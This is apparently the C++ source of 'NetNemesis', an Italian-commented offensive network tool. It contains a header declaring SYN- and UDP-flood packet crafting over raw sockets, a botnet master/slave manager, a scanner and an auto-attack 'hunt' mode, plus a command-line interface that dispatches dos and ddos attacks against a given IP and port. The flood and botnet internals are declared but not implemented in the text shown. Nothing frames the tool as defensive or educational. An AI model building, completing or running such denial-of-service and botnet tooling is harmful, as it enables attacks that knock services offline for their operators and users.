#ifndef NETNEMESIS_H
#define NETNEMESIS_H

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

#define PACKET_SIZE 4096
#define DEFAULT_BOTNET_PORT 6666

extern std::atomic<bool> g_running;
extern std::atomic<bool> g_is_master;
extern std::atomic<bool> g_is_slave;
extern std::atomic<bool> g_auto_hunt;
extern std::mutex g_print_mutex;

// Controllo privilegi
bool checkRoot();

// Packet Crafter
class PacketCrafter {
private:
    int raw_socket;
    struct sockaddr_in dest_addr;
    
    unsigned short calculateChecksum(unsigned short *buf, int nwords);
    void buildIpHeader(struct iphdr *iph, int dest_ip, int packet_len);
    void buildTcpHeader(struct tcphdr *tcph, int src_port, int dest_port, int seq, int ack, int flags);
    
public:
    PacketCrafter();
    ~PacketCrafter();
    bool initialize();
    void sendSYNFlood(const std::string &target, int port, int packets = 1000);
    void sendUDPFlood(const std::string &target, int port, int packets = 1000);
    void sendCustomPacket(const std::string &target, int port, const char *data, int data_len);
};

// Botnet
class BotnetManager {
private:
    int master_socket;
    std::vector<int> slave_sockets;
    std::thread listener_thread;
    std::thread slave_thread;
    std::mutex slaves_mutex;
    std::string master_ip;
    int master_port;
    
    void masterListener();
    void slaveConnector();
    void handleSlave(int slave_socket);
    
public:
    BotnetManager();
    void startMaster(int port);
    void startSlave(const std::string &ip, int port);
    void broadcastToSlaves(const std::string &cmd);
    void stop();
    bool isMaster() const { return g_is_master.load(); }
    bool isSlave() const { return g_is_slave.load(); }
};

// Scanner
class NetworkScanner {
private:
    std::thread scan_thread;
    std::vector<std::pair<std::string, int>> discovered_servers;
    std::mutex servers_mutex;
    
    void scanLoop();
    bool probePort(const std::string &ip, int port);
    
public:
    void start();
    void stop();
    std::vector<std::pair<std::string, int>> getServers();
};

// Attacchi
class AttackEngine {
private:
    PacketCrafter packet_crafter;
    BotnetManager *botnet;
    
public:
    AttackEngine(BotnetManager *bm);
    void executeDOS(const std::string &target, int port, bool use_raw = true);
    void executeDDOS(const std::string &target, int port, int bots = 10);
    void executeHunt();
};

// CLI
class NetNemesisCLI {
private:
    BotnetManager botnet;
    NetworkScanner scanner;
    AttackEngine attack_engine;
    
    void showBanner();
    void showMenu();
    void processCommand(const std::string &cmd);
    void botnetInteractiveMenu();
    
public:
    NetNemesisCLI();
    void run();
};

// Utils
namespace Utils {
    void logInfo(const std::string &msg);
    void logSuccess(const std::string &msg);
    void logError(const std::string &msg);
    void logWarning(const std::string &msg);
    void logAttack(const std::string &msg);
    void clearScreen();
    std::vector<std::string> split(const std::string &s, char delim);
    void animateAttack(const std::string &type, const std::string &target);
}

#endif
// Aggiungi a netnemesis.h prima di implementare
NetNemesisCLI::NetNemesisCLI() : attack_engine(&botnet) {}

void NetNemesisCLI::showBanner() {
    const char* banners[] = {
        R"(
    _   __      __   _  __                __
   / | / /___  / /__| |/ /___  __  ______/ /
  /  |/ / __ \/ / _ \   / __ \/ / / / __  / 
 / /|  / /_/ / /  __/   / /_/ / /_/ / /_/ /  
/_/ |_/\____/_/\___/_/|_\____/\__,_/\__,_/   
    [ Packet Crafting Edition - Linux Only ]
)",
        R"(
    ███╗   ██╗███████╗████████╗███╗   ██╗███████╗███╗   ███╗███████╗███████╗██╗███████╗
    ████╗  ██║██╔════╝╚══██╔══╝████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██║██╔════╝
    ██╔██╗ ██║█████╗     ██║   ██╔██╗ ██║█████╗  ██╔████╔██║█████╗  ███████╗██║███████╗
    ██║╚██╗██║██╔══╝     ██║   ██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║╚════██║
    ██║ ╚████║███████╗   ██║   ██║ ╚████║███████╗██║ ╚═╝ ██║███████╗███████║██║███████║
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝
                                    [ ROOT REQUIRED ]
)",
    };
    srand(time(NULL));
    std::cout << "\033[35m" << banners[rand() % 2] << "\033[0m" << std::endl;
}

void NetNemesisCLI::botnetInteractiveMenu() {
    std::cout << "\n\033[36m╔════════════════════════════════╗\n";
    std::cout << "║     BOTNET CONFIGURATION       ║\n";
    std::cout << "╠════════════════════════════════╣\n";
    std::cout << "║  1. MASTER - Diventa master    ║\n";
    std::cout << "║  2. SLAVE  - Connettiti a master║\n";
    std::cout << "║  3. BACK   - Torna al menu     ║\n";
    std::cout << "╚════════════════════════════════╝\033[0m\n";
    std::cout << "Scelta: ";
    
    int scelta;
    std::cin >> scelta;
    std::cin.ignore();
    
    if (scelta == 1) {
        std::cout << "Inserisci porta per il MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startMaster(port);
    } else if (scelta == 2) {
        std::cout << "Inserisci IP del MASTER: ";
        std::string ip;
        std::getline(std::cin, ip);
        std::cout << "Inserisci porta del MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startSlave(ip, port);
    }
}

void NetNemesisCLI::run() {
    Utils::clearScreen();
    showBanner();
    
    std::string input;
    while (g_running) {
        std::cout << "\033[32mroot@NetNemesis\033[0m";
        if (g_is_master) std::cout << "\033[31m[MASTER]\033[0m";
        if (g_is_slave) std::cout << "\033[33m[SLAVE]\033[0m";
        std::cout << ":# ";
        
        std::getline(std::cin, input);
        if (input.empty()) continue;
        
        auto args = Utils::split(input, ' ');
        std::string cmd = args[0];
        
        if (cmd == "clear") {
            Utils::clearScreen();
            showBanner();
        }
        else if (cmd == "botnet") {
            botnetInteractiveMenu();
        }
        else if (cmd == "dos" && args.size() >= 3) {
            attack_engine.executeDOS(args[1], std::stoi(args[2]));
        }
        else if (cmd == "ddos" && args.size() >= 3) {
            int bots = (args.size() > 3) ? std::stoi(args[3]) : 10;
            attack_engine.executeDDOS(args[1], std::stoi(args[2]), bots);
        }
        else if (cmd == "scan") {
            scanner.start();
        }
        else if (cmd == "hunt") {
            g_auto_hunt = !g_auto_hunt;
            Utils::logWarning(g_auto_hunt ? "HUNT MODE: ON" : "HUNT MODE: OFF");
        }
        else if (cmd == "exit") {
            g_running = false;
            botnet.stop();
            scanner.stop();
        }
        else if (cmd == "help") {
            std::cout << R"(
\033[36mComandi disponibili:
  botnet          - Menu configurazione botnet
  dos <ip> <port> - SYN Flood attack (raw packets)
  ddos <ip> <port> [bots] - Distributed attack
  scan            - Avvia scanner passivo
  hunt            - Toggle auto-attack
  clear           - Pulisci schermo
  exit            - Esci\033[0m
)" << std::endl;
        }
    }
}